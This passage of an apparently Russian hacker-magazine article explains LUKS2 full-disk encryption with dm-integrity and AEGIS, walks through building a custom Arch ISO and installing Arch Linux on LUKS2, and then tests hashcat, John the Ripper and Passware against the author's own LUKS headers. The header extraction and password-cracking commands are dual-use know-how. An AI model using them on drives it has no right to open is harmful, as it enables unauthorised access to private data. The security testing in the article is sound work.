ные пользователи, но и корпорации не сильно пекут ся о личных данных.
  К сожалению, на этом проблемы не заканчива ются. Большинство нынеш‐
них систем полнодискового шифрования (Full Disk Encryption — FDE) обес‐
печивают конфиденциальность данных, но не их целостность. Это означает,
что злоумышленник может физически изменить байт информации на диске
и пользователь не сможет обнаружить, что и где изменилось и откуда сбои.
Все потому, что сектор открытого текста равняет ся сектору шифротекста,
а метаинформацию хранить негде.
  Искажение данных может произойти не только в результате прямого воз‐
действия злоумышленником, но и по чистой слу чайности: неплотно воткнутый
кабель, перезапись данных утилитой, которая не распознает формат LUKS,
и так далее.
  Проблему  целостности  данных решает  аутентифицированное шиф‐
рование (Authenticated Encryption with Associated Data — AEAD). Это не новая
тема, и активные исследования вмес те с конкурсами на лучший алгоритм (см.
CAESAR) ведутся десятки лет. Но для реализации AEAD в пол нодис ковом
шифровании нужно придумать, где хра нить допол нительные данные  (те
самые AD).


Зачем шиф ровать
Если ты еще сомневаешь ся, что полнодисковое шифрование — нужная шту‐
ка, то подумай вот о чем: оно не толь ко помога ет сохранить в тайне твою
очень важную инфу и пикантные фоточки, защищая тебя от разного рода
мошенничества и шантажа, но и предохраняет диск от изме нений. Например,
тебя могут на какое‐то время разлучить с тво им компьютером, и речь не толь‐
ко о «маски‐шоу», но и, например, о дотошном погранконтроле. Как в таких
случаях убе диться, что на диске не появилось чего‐то нового? Ну и пос‐
ледний, чисто эмоциональный аргумент: прос то представь, какой неистовый
баттхерт будет у кого‐то, когда он не сможет получить дос туп к твоим дан‐
ным, — даже если там нет ничего интересного!



РЕШЕНИЕ
Ребята из Чехии несколько лет разрабатывали решение для Linux, которое
сможет предоставить FDE с функцией AEAD. Главными критериями для этого
были:
 • обеспечить работу без дополнительного оборудования;
 • сделать возможным применение на самых обычных дисках, которые дос‐
   тупны в магазине, а не по спецзаказу;
 • использовать родной размер сектора;
 • реализовать возможность восста новления данных в случае перебоя
   питания;
 • использовать (и писать) только свободный код и алгоритмы.

Результатом разработки стали новые объекты (targets) для device mapper:
dm‐integrity, обновленный dm‐crypt с аутентифици рованным шифрованием
и формат LUKS2. Их под держка включена в ядро Linux начиная с версии 4.12,
а новые шифры AEGIS и MORUS (финалисты CAESAR) дос тупны с 4.18.


Под робнее о dm-integrity, dm-crypt и LUKS2

   dm-integrity эмулиру ет блочное устройство с дополнительными тегами
в каждом секторе и использует их для хранения мета информации. Поддержи‐
вает журналирование, которое мож но опциональ но включить — например,
чтобы можно было восста новить данные пос ле сбоя питания. Применяется
как в паре с dm‐crypt для предос тавления AEAD, так и отдельно — для кон‐
троля целостности данных без шифрования. Управляется утилитами crypt‐
setup, если нужно шифрование, или integritysetup, соот ветственно,
без него.
  dm-crypt поддерживает режимы AEAD для шифров и рандомизацию век‐
тора инициализации (Initialization Vector). На каж дую запись в сектор ядром
генерируется случайный Initialization Vector. К примеру, в режиме XTS вектор
шифруется хитрым обра зом, что позволяет брать для него предсказуемый
номер сектора (plain или plain64).
  LUKS2 — это вторая версия формата LUKS с рас ширенными воз можнос‐
тями. Были устранены некоторые проб лемы и ограниче ния, однако боль‐
шинство идей LUKS1 оста лись. Среди новых возможностей:
 • поддержка затратных для памяти функций формирования ключа (key der‐
    ivation function — KDF);
 • реализован новый вид заголовка (бинарный + JSON), добавлен механизм
   контрольных  сумм,  заголо вок  дуб лирован  (кроме  области  ключей)
   из соображений безопасности;
 • клю чам можно назначать приоритет;
 • JSON позволяет рас ширять воз можности формата, не модифицируя
   бинарную структуру;
 • в заголовке реализованы токены, которые свя заны со слотами для ключей
   и описывают, где взять пароль. Токены могут быть использованы для под‐
   держки механизмов внешнего хра нения ключей.

Посмотреть фор мат заголовка LUKS2 полностью и изучить каждое поле мож‐
но в спецификации.
  Argon2 — та самая, затратная для памяти и центрального процессора,
KDF. В Linux доступны два варианта: Argon2i и Argon2id.


На данный момент шиф ры AEAD, которые есть в ядре (AES‐GCM и ChaCha20‐
Poly1305), имеют короткий (96‐bit) одноразо вый код (nonce). Это означает,
что вероятность кол лизии слишком большая (с точки зрения криптографии)
и ее нельзя игнорировать, так как использование одноразового кода дважды
(nonce reuse) фатально для AES‐GCM. На вся кий случай отме чу, что это не
касается шифрования информации, переда ваемой по сети.
  Для обеспечения AEAD в FDE сейчас стоит использовать новые AEGIS
или MORUS. Или же AES‐XTS + HMAC, если нет доступа к 4.18. Проблема
этой конструкции в том, что нуж но хешировать сектор, а хеширование 4 Кбайт
данных занимает какое‐то время. Другими словами: это долго.
  Поддержка dm‐integrity включается в ядре опцией CONFIG_DM_INTEGRITY.
В Arch Linux проверить, включена ли она у тебя, мож но командой


$ zgrep ‐E "CONFIG_DM_INTEGRITY|CONFIG_BLK_DEV_INTEGRITY" /proc/
config.gz
CONFIG_BLK_DEV_INTEGRITY=y
CONFIG_DM_INTEGRITY=m

В Ubuntu список конфигов ядра находится в раз деле /boot, файл config‐
версия_ядра — грепай его, и узна ешь всю правду.
   Стоит упомянуть, что авто ры не пыта ются пере изобрести велоси пед
и придумать невиданную ранее концепцию. Подобное решение, но с другим
подходом существует во FreeBSD и называ ется GELI. Здесь для обес печения
целостности данных используется HMAC.


ПОЛНОДИСКОВОЕ ШИФРОВАНИЕ С LUKS2 НА ПРАКТИКЕ
Итак, у нас в арсенале ско ро появят ся новые алгоритмы и новые фичи.
Но попробовать их не терпится уже сейчас, чем я и занялся.


           WARNING

                      Работа над форматом LUKS2 еще не завершена,
                          так что не рекомендуется использовать его в про‐
                        дакшене!


Тут же нас встречает первая проблема: поддержки со стороны загрузчиков
просто‐напросто нет. На данный момент ни GRUB, ни другие не умеют
работать с LUKS2.
  Отсутствие возможности грузиться с раздела LUKS2 при этом не конец
света: /boot зашифруем в LUKS1. Кто‐то возразит, что /boot — главный раз‐
дел и злоумышленнику, который получил дос туп к нему, уже все равно, что
у тебя в /. И это правда. Но к сожалению, пока что приходится работать с тем,
что есть. LUKS1, конеч но же, неплох, но мы сюда пришли новые фичи тестить.
В любом случае LUKS2 находится в ста дии допила напильником развития
и модификации, поэто му о деплое в продакшен речи в любом случае не идет.
  Тем временем сзади подкрался вто рой подвох: это ядро 4.18, которое,
как ты помнишь, нужно для AEGIS и MORUS и которого на момент написания
статьи нет ни в одном live‐уста новщике. Единственная идея, которая мне при‐
ходит в голову, — это кастомный archiso, так как ежемесячный билд содержит
только версию 4.17.11.


Модификация archiso
Процесс хорошо описан в Arch Wiki. В двух словах: нужно скачать официаль‐
ный образ live‐установщика, рас паковать, внес ти свои изменения и запако‐
вать обратно.


             INFO

                      Если ты читаешь статью, когда на све те уже есть
                         установщик с ядром 4.18, пропускай эту подгла‐
                         ву — ты живешь в прек расном будущем и тебе все
                        это не пригодится.


На странице загрузки выбирай наибо лее подходящее зеркало и качай:


$ curl ‐q ‐OL "http://mir.archlinux.fr/iso/2018.08.01/archlinux‐2018.
08.01‐x86_64.iso{,.sig}"

Не забудь проверить целос тность файла .iso:


$ gpg ‐‐recv‐keys 9741E8AC && gpg ‐‐verify archlinux‐2018.08.
01‐x86_64.iso.sig





                  Проверка целос тности обра за


$ mkdir /mnt/archiso
$ mount ‐t iso9660 ‐o loop archlinux‐2018.08.01‐x86_64.iso /mnt/
archiso

Так как образы ISO монтируются в режиме только для чтения, скопируй
содержимое в другую директорию. Перед копированием удостоверься, что
директории ~/customiso не существу ет, и выполни


$ cp ‐a /mnt/archiso ~/customiso; sync

Далее нужно распаковать airootfs.sfs утилитой unsquashfs, она есть в составе
пакета squashfs‐tools ($ sudo pacman ‐S squashfs‐tools):


$ cd ~/customiso/arch/x86_64/
$ unsquashfs airootfs.sfs

Для обновления ядра понадобится... ядро. ;‐) Копируй:


$ cp ../boot/x86_64/vmlinuz squashfs‐root/boot/vmlinuz‐linux

Теперь можно делать chroot в систему, для этого используй скрипт arch‐ch‐
root из пакета arch‐install‐scripts:


$ sudo arch‐chroot squashfs‐root /bin/bash

Для установки пакетов нужно сна чала инициализиро вать ключи для pacman
внутри chroot:


$ pacman‐key ‐‐init
$ pacman‐key ‐‐populate archlinux

Обнови все пакеты:


$ pacman ‐Syu ‐‐force archiso linux

В файле /etc/mkinitcpio.conf замени HOOKS=(...) на


HOOKS=(base udev memdisk archiso_shutdown archiso archiso_loop_mnt
archiso_pxe_common archiso_pxe_nbd archiso_pxe_http archiso_pxe_nfs
archiso_kms block filesystems keyboard)

Пересобери initramfs:


$ mkinitcpio ‐p linux

По окончании нужно создать список пакетов, почистить кеш менеджера
пакетов и выйти из окружения chroot:


$ LANG=C pacman ‐Sl | awk '/\[installed\]$/ {print $1 "/" $2 "‐" $3}'
 > /pkglist.txt
$ pacman ‐Scc
$ exit

Перенеси све жее ядро и список пакетов, а также уда ли запасной образ (fall‐
back), так как он не исполь зует ся уста новщиком:


$ mv squashfs‐root/boot/vmlinuz‐linux ~/customiso/arch/boot/x86_64/
vmlinuz
$ mv squashfs‐root/boot/initramfs‐linux.img ~/customiso/arch/boot/
x86_64/archiso.img
$ rm squashfs‐root/boot/initramfs‐linux‐fallback.img
$ mv squashfs‐root/pkglist.txt ~/customiso/arch/pkglist.x86_64.txt

Создай новый airootfs.sfs, почисти мусор и сгенерируй контрольную сумму:


$ rm airootfs.sfs
$ mksquashfs squashfs‐root airootfs.sfs
$ sudo rm ‐r squashfs‐root
$ sha512sum airootfs.sfs > airootfs.sha512

Чтобы можно было грузиться в режиме UEFI, надо обновить загрузочный
образ:


$ mkdir mnt
## Для монтирования FAT файловых систем нужен пакет dosfstools
$ sudo mount ‐t vfat ‐o loop ~/customiso/EFI/archiso/efiboot.img mnt
$ sudo cp ~/customiso/arch/boot/x86_64/vmlinuz mnt/EFI/archiso/
vmlinuz.efi
$ sudo cp ~/customiso/arch/boot/x86_64/archiso.img mnt/EFI/archiso/
archiso.img

Последнее, что нужно, — это запако вать все в новый ISO. Читай метку ста‐
рого .iso при помощи lsblk ‐f или blkid.


                   Вывод команды lsblk ‐f


$ iso_label="ARCH_201808"
## xorriso есть в пакете libisoburn (sudo pacman ‐S libisoburn)
$ xorriso ‐as mkisofs \
   ‐iso‐level 3 \
   ‐full‐iso9660‐filenames \
   ‐volid "${iso_label}" \
   ‐eltorito‐boot isolinux/isolinux.bin \
   ‐eltorito‐catalog isolinux/boot.cat \
   ‐no‐emul‐boot ‐boot‐load‐size 4 ‐boot‐info‐table \
   ‐isohybrid‐mbr ~/customiso/isolinux/isohdpfx.bin \
   ‐eltorito‐alt‐boot \
   ‐e EFI/archiso/efiboot.img \
   ‐no‐emul‐boot ‐isohybrid‐gpt‐basdat \
   ‐output arch‐custom.iso \
   ~/customiso
$ sudo umount mnt
$ sudo rm ‐r mnt

Все готово, записывай arch‐custom.iso на диск или флешку и гру зись:


$ sudo dd if=arch‐custom.iso of=/dev/xxx bs=1M status=progress




                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

    ПОЛНОДИСКОВОЕ
              LUKS2ШИФРОВАНИЕ С
                       ИЗУЧАЕМ НОВУЮ ВЕРСИЮ
           ПОПУЛЯРНОГО СРЕДСТВА ШИФРОВАНИЯ
           ДЛЯ LINUX И ПРОВЕРЯЕМ, МОЖНО ЛИ ЕГО
                                  ВЗЛОМАТЬ





Установка Arch Linux на LUKS2
Если модификации прошли успешно и удалось загрузиться, то первая строч‐
ка на экране сообщит версию ядра.





         Успешная загрузка модифицированного live‐установщика

Подробно расписывать, как уста навливать Arch Linux, нет смысла — этой
информации полно в интернете. Затрону главные моменты, которые каса‐
ются LUKS2 и «прикручивания» шифрования в целом.


             INFO

                       Установка проводится на чистый, новый или пус‐
                        той диск, желательно SSD. Если у тебя есть дру‐
                        гие разделы,  то придется их нюкнуть. Также
                      нужен UEFI, который, скорее всего, твоя машинка
                      поддерживает.


Если ставишь на виртуалку, то главное — вклю чить поддержку EFI и проб‐
росить флешку.





                    Нас трой ки EFI для VirtualBox





                   Нас трой ки USB для VirtualBox


           WARNING

                     Дан ные ОПАСНОСТЕ!!1  Единственный  способ
                       расшифровать их — это ключ‐файл на флешке.
                     Выбирай понадежней или оставь возможность
                       ввести пароль.


Чтобы в один прекрасный день не лишиться данных из‐за испорченной
или утерянной флешки, сра зу добавлю воз можность открывать парольной
фразой. Из‐за этого у меня будут задействованы два слота в заголовке:
пароль (слот 0) и ключ‐файл (слот 1), который я добавлю потом. Если любишь
риск, то можешь пароль ный слот уничтожить пос ле добавления файла.
   Топология диска у меня:
 • /dev/sda1 — раздел для обра зов .eﬁ, не зашифрован, FAT32;
 • /dev/sda2 — раздел /boot, зашиф рован, LUKS1;
 • /dev/sda3 — / , зашифрован, LUKS2.

GPT — таблица разделов. Отдельный /boot нужен, как ты помнишь, из‐за
того, что загрузчики пока не умеют открывать LUKS2. По большому счету мож‐
но избавиться от sda1 и хра нить образ GRUB в фай ле .eﬁ на той же флешке:
для этого нужно создать раз дел с FAT (по спецификации UEFI) и вспомнить
кое‐какие дополнительные ключи (‐‐removable) для grub‐install.
  Смотрю диск:


root@archiso ~ # fdisk ‐l
Disk /dev/sda: 119.2 GiB, 128035676160 bytes, 250069680 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: BA18A20B‐089C‐47EC‐A88C‐096FE6A5A7EE
Device      Start      End  Sectors  Size Type
/dev/sda1    2048   411647   409600  200M EFI System
/dev/sda2  411648   821247   409600  200M Linux filesystem
/dev/sda3  821248 21792767 20971520   10G Linux filesystem

И создаю LUKS2 на /dev/sda3:


$ cryptsetup luksFormat ‐‐type luks2 ‐‐pbkdf argon2id ‐‐cipher
aegis256‐random ‐‐integrity aead ‐‐integrity‐no‐journal /dev/sda3

Чтобы использовать кон троль целостнос ти данных (‐‐integrity), на устрой‐
ство сначала нужно записать контрольные суммы. Поэтому, если у тебя боль‐
шой диск, придется запастись терпением.





                     Подготов ка устройства

А вот сравнение скорос ти работы алгоритмов на SSD, приведенное раз‐
работчиками. Линейная запись и чтение.





               Графики сравнения скорости алгоритмов

В качестве PBKDF я использую Argon2id. Если установка идет на одном
железе, а система будет использовать ся на другом, то дополнительно можно
указать, сколько памяти, процессорных потоков и итераций использовать.
Ключи:
 • pbkdfmemory <number>;
 • pbkdfparallel <number>;
 • pbkdfforceiterations <num>.

Если не указывать их, то будет проведен бенчмарк текущего железа и цифры
взяты оттуда.
  Шифр — aegis256‐random. Для LUKS2 доступны сле дующие алгоритмы
AEAD:
 • aegis128‐random;
 • aegis256‐random;
 • morus640‐random;
 • morus1280‐random.

Суффикс ‐random здесь ука зывает на вектор инициализации. Более под‐
робное сравнение смот ри в спецификации и магистерской диссертации.
   Как видно из графиков, журнал уменьшает скорость, поэтому отключаю
его. На ноутбуке он, в прин ципе, не нужен, так как внезапная потеря питания
в большинстве случаев ему не грозит.
  Смотрю, что получилось, и открываю:


$ cryptsetup luksDump /dev/sda3
$ cryptsetup open /dev/sda3 crypto_root
$ lsblk ‐f





                 Содержимое заголовка LUKS2

То самое эмулированное промежуточное устройство crypto_root_dif, с допол‐
нительным местом под метаданные. Для пользователя оно прозрачно,
и работа проходит с обычным блочным устрой ством, в данном слу чае
crypto_root.





      Новое, эмулированное устройство с контрольными суммами

Подготовлю раздел /boot в LUKS1 и также открою его:


$ cryptsetup luksFormat ‐h whirlpool ‐i 5555 /dev/sda2
$ cryptsetup luksDump /dev/sda2
$ cryptsetup open /dev/sda2 crypto_boot

Тут ничего нового: любимая хеш‐функция и чуть боль ше итераций.





                        Заголо вок LUKS1

Окей, разделы готовы. Обрати внимание: после открытия я работаю только
с эмулированными устройства ми /dev/mapper/crypto_boot и /dev/mapper/
crypto_root, а не с физическими /dev/sda2 и /dev/sda3.
  Создаю файловые системы:


$ mkfs.vfat ‐F32 ‐n "ESP" /dev/sda1
$ mkfs.ext2 ‐L "arch_boot" /dev/mapper/crypto_boot
$ mkfs.ext4 ‐L "arch_root" /dev/mapper/crypto_root

Монтирую:


$ mount /dev/mapper/crypto_root /mnt
$ mkdir /mnt/boot
$ mount /dev/mapper/crypto_boot /mnt/boot
$ mkdir /mnt/boot/efi
$ mount /dev/sda1 /mnt/boot/efi

Всегда используй только свежие зеркала:


## Переименовать список старых
$ mv /etc/pacman.d/mirrorlist{,.old}
## Скачать новые
## FR в ссылке можешь заменить на код своей страны или той, что рядом
$ curl ‐q ‐sSL 'https://archlinux.org/mirrorlist/?country=FR&
protocol=https' | sed ‐e 's/^#S/S/g' >/etc/pacman.d/mirrorlist

Для аутентификации по флешке нужно добавить допол нительный ключ. Ты
можешь сде лать его из последовательности битов на ней и указать GRUB
использовать их при помощи следующего параметра ядра: cryptkey=de‐
vice:offset:size, где
 • device — блочное устройство, на котором хра нится ключ;
 • offset — смещение, по которому считывать байты;
 • size — сколько байтов считать.

В качестве device можно исполь зовать как /dev/sdX, так и UUID=. Например,


cryptkey=/dev/sda:0:512

или


cryptkey=UUID=1234‐5678:0:512

В моем случае это будет обычный файл. Поэто му вос пользуюсь немного дру‐
гим форматом: cryptkey=device:fstype:path и прос то укажу путь к нему.
 • fstype — тип файловой системы, мож но использовать auto;
 • path — путь к файлу.

Если флешка чистая, без разделов, то при дется их создать. Какую именно
файловую систему использовать — дело твое. Для экономии времени вос‐
пользуюсь установочной флешкой. Соз дам директорию и примонтирую в нее:


$ mkdir /flash
$ mount /dev/sdb2 /flash





             Проверка разделов флешки и монтирование

Сгенерирую ключ‐файл:


$ dd if=/dev/urandom of=/flash/root_key.bin bs=1024 count=2


        WWW

                        Статья и ин тересное обсужде ние для  тех, кто
                      думает, что чуть выше я совершил акт кощунства.


Добавлю ключ:


$ cryptsetup luksAddKey ‐‐pbkdf argon2id /dev/sda3 /flash/root_key.
bin

Экстремалы могут удалить парольный слот командой cryptsetup luksKill‐
Slot /dev/sda3 0, где 0 — номер сло та.
  Все готово к установке:


$ pacstrap /mnt base base‐devel vim grub efibootmgr dialog wpa_su
pplicant

Генерирую fstab:


$ genfstab ‐U /mnt >> /mnt/etc/fstab

Далее буду проводить настройки системы изнутри. Для этого использую ch‐
root: arch‐chroot /mnt. Первым делом — GRUB. В файле /etc/default/
grub раскомментируй GRUB_ENABLE_CRYPTODISK=y и замени строки


GRUB_CMDLINE_LINUX_DEFAULT="quiet"
GRUB_CMDLINE_LINUX=""

на вот такие:


GRUB_CMDLINE_LINUX_DEFAULT="verbose"
GRUB_CMDLINE_LINUX="cryptdevice=UUID=7a40a90f‐2533‐41e0‐bb94‐fd30f4
026544:crypto_root cryptkey=UUID=5F6A‐991B:auto:/root_key.bin root=/
dev/mapper/crypto_root"

Обрати внимание, что GRUB_CMDLINE_LINUX="..." — одна строка, никаких
переносов нет.





                      Конфиг /etc/default/grub

Идентификаторы UUID смотри через # blkid.





         Список UUID дос тупных в системе блочных устрой ств

Примерная схема работы:
 1. GRUB запросил пароль от раздела /boot.
 2. Пароль подходит? Открыл, прочитал его, нашел initramfs, передал ему
   управление.
 3. Закончил работу, все закрыл и забыл.

Параметр ядра cryptkey=UUID=5F6A‐991B:auto:/root_key.bin указывает
initramfs, где взять ключ от / — корневого раздела (LUKS2). Если флешка
недоступна, он об этом сообщит и зап росит пароль. А если ты удалил слот
с паролем, то загрузиться не получит ся.
  Файл /etc/crypttab работает схожим с /etc/fstab образом, только
для зашифрованных дисков. В нем ука зываются все разделы (кроме кор‐
невого), которые дол жны быть откры ты при загрузке системы. Конфиг
crypttab читается перед fstab, но автомон тирование (уже открытых) раз‐
делов производит второй. Таким образом, crypttab — это то, что нужно
для открытия /boot во время загрузки системы, так как GRUB, передав
управление initramfs, его закрыл и забыл все клю чи.
   Чтобы не вводить пароль от него дважды (для GRUB и для crypttab), соз‐
дай и добавь ключ‐файл и для раздела /boot:


$ mkdir /root/keys
$ dd if=/dev/urandom of=/root/keys/boot_key.bin bs=1024 count=2
$ chmod ‐R 0 /root/keys/

Добавляй, как обыч но:


$ cryptsetup luksAddKey /dev/sda2 /root/keys/boot_key.bin





         Проверим, появился ли новый слот с файлом‐ключом

И теперь используй его для автоматичес кого открытия. В конец /etc/crypt‐
tab допиши:


crypto_boot UUID=4d053fc0‐ded6‐4390‐9e7c‐a8abfa503cd5 /root/keys/
boot_key.bin luks,timeout=15





                     Пример моего crypttab

Для большей надежности перепроверь UUID в /etc/fstab. Для корневого
раздела и для /boot они должны соответствовать crypto_root и crypto_‐
boot, а не sda2 и sda3.





                Записи автосгенерированного fstab

Осталось добавить компоненты для initramfs с помощью скрипта mkinitcpio.
Для этого подредактируй файл /etc/mkinitcpio.conf и в строку


HOOKS=(base udev autodetect modconf block filesystems keyboard fsck)

добавь encrypt, чтобы получилось


HOOKS=(base udev autodetect modconf block encrypt filesystems
keyboard fsck)

В MODULES=() допиши dm_integrity и vfat:


MODULES=(dm_integrity vfat)

Иначе при загрузке получишь ошибку Kernel doesn’t support dm‐integrity map‐
ping. Модуль vfat нужен, так как раздел флешки с клю чом — в FAT.
  Пересобери initramfs:


$ mkinitcpio ‐p linux





                     Ус пешный пересбор initramfs

Последнее, что нужно сделать, — это уста новить GRUB и сгенери ровать
для него .cfg‐файл командами


$ grub‐install ‐‐target=x86_64‐efi ‐‐efi‐directory=/boot/efi ‐‐bootlo
ader‐id=crypto_arch
$ grub‐mkconfig ‐o /boot/grub/grub.cfg




                 GRUB успешно уста новился


## Задай пароль для root
$ passwd
## Выйди из chroot
$ exit
## Отмонтируй все
$ umount ‐R /mnt
## Последний раз все проверь и пиши
$ reboot

Поздравляю, твой свежий Arch Linux установлен на раздел LUKS2 с включен‐
ным контролем целостнос ти данных!
  Парочка топорных тестов скорос ти дешево го SSD.





              Запись и чтение на шифрованном раз деле





             Запись и чтение на нешифрованном разделе



                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

    ПОЛНОДИСКОВОЕ
              LUKS2ШИФРОВАНИЕ С
                       ИЗУЧАЕМ НОВУЮ ВЕРСИЮ
           ПОПУЛЯРНОГО СРЕДСТВА ШИФРОВАНИЯ
           ДЛЯ LINUX И ПРОВЕРЯЕМ, МОЖНО ЛИ ЕГО
                                  ВЗЛОМАТЬ





ПРОВЕРКА НА ПРОЧНОСТЬ
Это все замечательно, но, если твой диск попадет в руки злоумышленнику,
насколько тяжело (или легко) тому будет достать данные? Сейчас проверим.
   Стоит понимать, что есть множество способов похитить нужную инфу.
LUKS защищает данные в офлайне — то есть диск (раздел, контейнер)
или закрыт, или отклю чен от питания вовсе. Ины ми словами, не думай, что,
установив LUKS, ты волшебным обра зом навсегда обезопасишь данные.
Если оставляешь компьютер без присмотра с открытым разделом или пароль
записан на стикере, то извини: никакой LUKS тут не поможет.
  Для тестов я выбрал четыре про дукта: два открытых и два коммерчес ких.
Открытые — это John the Ripper и hashcat. Из коммерческих я знаю продукт
ElcomSoft, но он не поддерживает даже LUKS1, поэтому сразу отпадает. Вто‐
рой найденный мной вариант — это Passware. Никогда не слышал об этой
конторе, нашел через поисковик. Список клиентов серьезный: NASA, минис‐
терства обороны и юстиции США и дру гие.
  Все инструмен ты поддерживают GPU. Фермы для майнинга, к сожалению
(или к счастью), у меня нет, и в качес тве GPU исполь зовалась моя GTX 1050
Ti. Посмотрим, что может эта ста рушка против LUKS и LUKS2. Для взлома
не нужен диск или раздел полностью, дос таточно заголовка. Извлекаю их
на флешку:


$ cryptsetup luksHeaderBackup /dev/sda2 ‐‐header‐backup‐file /flash/
boot_header.bin
$ cryptsetup luksHeaderBackup /dev/sda3 ‐‐header‐backup‐file /flash/
root_header.bin


John the Ripper





                      Ин формация о JtR

Ставлю свежую версию и смотрю, что есть в арсенале:


$ ./john ‐‐list=formats ‐‐format=opencl | grep ‐i luks

Нет вывода. Окей, как нас чет CPU?


$ ./john ‐‐list=formats ‐‐format=cpu | grep ‐i luks
lotus5, lotus85, LUKS, MD2, mdc2, MediaWiki, monero, money, MongoDB,
scram,

Что поделать, придется довольствовать ся CPU. Пробую:


$ ./luks2john.py /tmp/boot_header.bin


                     JtR не поддерживает формат XTS

Как видно  из  скриншота, даже формат AES‐XTS не поддержи вается,
LUKS2 нет смысла пробовать. Это было быстро, идем дальше.


hashcat
$ ./hashcat ‐‐version
v4.2.1‐25‐gfe04ccc1
$ ./hashcat ‐‐help | grep ‐i luks
  14600 | LUKS                                             |
Full‐Disk Encryption (FDE)

Есть только LUKS пер вой версии. Хотя бы умеет работать с AES‐XTS, проведу
бенчмарк:


$ ./hashcat ‐m 14600 ‐b ‐‐quiet
Hashmode: 14600 ‐ LUKS (Iterations: 163044)
Speed.Dev.#1.....:     3157 H/s (22.86ms) @ Accel:2 Loops:1024 Thr:
1024 Vec:1
Started: Wed Aug 22 21:41:42 2018
Stopped: Wed Aug 22 21:42:01 2018

3 217 хешей  в  секунду для 163 044  итераций — неплохо. У меня
выходит 2 941 833 для парольного слота и 2 137 768 для файла (если пос‐
мотреть на скриншот luksDump).
  Для hashcat недостаточно прос то сделать luksHeaderBackup, нужно писать


$ dd if=/dev/XXXX of=header.luks bs=512 count=4097

Все шло хорошо, но тут меня ждал сюрприз в виде ошибки hashcat/OpenCL/
m14651‐pure.cl: No such  file  or  directory. Как оказалось, hashcat
не поддерживает хеш‐функцию whirlpool. Иногда нуж но читать доки до конца.
На той же странице форума английскими буквами написано:


There’s two things missing (at the moment) in order to make hashcats
LUKS support "full featured":
    Support for Keyfiles
    Support for Whirlpool

Чтобы не перебивать раз дел /boot с использованием дефолтной SHA‐256,
создам отдельный криптоконтейнер и возьму заголовок с него, от этого
ничего не поменяется.


## Создам файл
$ truncate ‐s 100M sha_container
## Сделаю из него криптоконтейнер
$ cryptsetup luksFormat ‐i 5555 sha_container

И еще очень важная деталь: в контейнере должна быть файловая система,
иначе пароль не подберется никог да, даже если он есть в спис ке. Это тоже
упоминается на форуме по ссылке выше.


## Открою
$ sudo cryptsetup open sha_container sha_cont
## Создам ФС
$ mkfs.ext4 /dev/mapper/sha_cont
## Закрою
$ sudo cryptsetup close /dev/mapper/sha_cont
## Извлекаю заголовок
$ dd if=sha_container of=sha_header_hashcat.bin bs=512 count=4097

В этом заголовке другое количес тво итераций — 9 756 846.


$ cryptsetup luksDump sha_header_hashcat.bin
LUKS header information for sha_header_hashcat.bin
Version:        1
Cipher name:    aes
Cipher mode:    xts‐plain64
Hash spec:      sha256
Payload offset: 4096
MK bits:        256
MK digest:      f6 f7 78 2e 00 be 93 6a d9 01 c1 d6 12 d2 1f 28 58
e5 52 e9
MK salt:        b2 0b 2f bd 4b cb d6 38 b3 71 45 48 62 e0 2f e6
                ea 84 16 c3 28 c7 ba 5d 5a ad 16 37 26 61 e5 c0
MK iterations:  220288
UUID:           cf458e89‐9e5a‐4fa8‐bf1c‐ee9045bc4d5d
Key Slot 0: ENABLED
  Iterations:           9756846
  Salt:                 5b 7c 16 4b d4 b5 a8 eb da 6c d4 ea f8 2c 32
6c
                          01 0c ed c1 3e 0d 87 14 5d d8 e0 d6 ce fb
b2 ab
  Key material offset:  8
  AF stripes:             4000

Пробую и вижу один хеш в минуту и четыре секунды:


$ ./hashcat ‐m 14600 ‐a 0 sha_header_hashcat.bin pwdd
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: LUKS
Hash.Target......: sha_header_hashcat.bin
Time.Started.....: Wed Aug 22 22:56:35 2018 (1 min, 4 secs)
Time.Estimated...: Wed Aug 22 22:57:39 2018 (0 secs)
Guess.Base.......: File (pwdd)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:        0 H/s (0.40ms) @ Accel:2 Loops:64 Thr:512
Vec:1
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0‐1 Iteration:9756800‐9756845
Candidates.#1....: 112233 ‐> 112233
HWMon.Dev.#1.....: Temp: 35c Fan: 45% Util: 96% Core:1860MHz Mem:
3504MHz Bus:8

Наблюдается проблема: hashcat начинает перебирать количество итераций,
пока не дойдет до нужного, а не читает его пря мо с заголовка. Делает он
это для каждого пароля в файле, поэтому тест для одного пароля занимает
долгое время.


Passware
Из доступных на сайте продуктов я выб рал Passware Kit Forensic, полная вер‐
сия стоит 995 долларов. Взял триалку, в которой время взлома ограничено
одной минутой. В принципе, это го должно хва тить, чтобы оценить скорость
работы. Запускаю, смотрю список доступных форматов FDE.





              Поддерживаемые Passware форматы FDE

Есть LUKS1, нет LUKS2, про бую.





                   Passware не поддерживает whirlpool

Ситуация та же, что и с hashcat, — нет поддержки whirlpool. Беру криптокон‐
тейнер с SHA‐256, добавляю брутфорс‐ата ку. Чтоб сократить время ожи‐
дания до минимума, явно указываю только цифры и длину пароля.





                Метод гру бой силы в Passware

В результате получаю тринадцать паролей в минуту. Если верить программе,
брутфорс шестизначного цифрового пароля займет месяц и 26 дней.





                 Скорость взлома LUKS1 в Passware


Ито ги
Наивно было надеяться, что формат, который сей час на стадии постоянной
доработки, будет поддерживать ся хоть каким‐нибудь продуктом. На его
реализацию нужно потратить время и ресурсы, а спецификация формата
может измениться в следующем релизе.
   Удивило отсутствие поддержки whirlpool — он‐то в LUKS есть давно.
Видимо, разработчики решили не париться и предпочли поддержать только
умолчательный вариант.
  По результатам видно, что стандартная PBKDF2 неплохо справляется
с задачей. Возможно, перед парой сотен или тысяч GPU она не устоит, но для
этого есть новый Argon2.


EXIT()
Радует энтузиазм разработчиков: они делают современную крипту доступной
каждому и бесплатно. LUKS2 — интерес ный формат с кучей фишек. К сожале‐
нию, сложность конфигура ции и отсутс твие поддержки со стороны загрузчи‐
ков замедляет его появление на сцене. Использовать его с включенным кон‐
